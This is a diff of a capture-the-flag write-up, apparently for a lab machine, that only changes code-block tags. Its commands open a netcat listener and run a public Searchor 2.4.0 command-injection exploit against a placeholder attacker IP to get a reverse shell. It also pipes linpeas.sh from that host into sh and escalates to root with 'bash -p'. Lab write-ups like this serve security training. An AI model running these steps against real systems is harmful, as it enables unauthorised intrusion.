@@ -11,7 +11,7 @@ https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
 We will come back to it after a quick NMAP scan.
 
 ## NMAP
-```shell
+```zsh
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.52
@@ -26,29 +26,29 @@ Nothing interesting here either, Looks like the Apache and Werkzeug versions are
 
 ## Exploitation
 Using the exploit I found earlier all we need to do is clone the repository with:
-```shell
+```console
 git clone https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
 ```
 Then we use netcat to listen on port 9001 which is the default for the exploit:
-```shell
+```console
 nc -lnvp 9001
 ```
 Then we run the exploit using:
-```shell
+```console
 ./exploit.sh searcher.com <ATTACKER_IP>
 ```
 We got a shell and we can find the ```user.txt``` file under /home/svc.
 ## Privilege Escalation
 First thing we do is run linpeas on the machine so we open an http server using:
-```shell
+```console
 python3 -m http.server 80
 ```
 Then on the victim machine we use 
-```shell
+```console
 curl -L http://<ATTACKER_IP>/path/to/linpeas.sh | sh
 ```
 We now let linpeas run, and when it finishes we find we have access to /usr/bin/bash so to get root all we have to us run:
-```shell
+```console
 /usr/bin/bash -p
 ```
 And we got root.
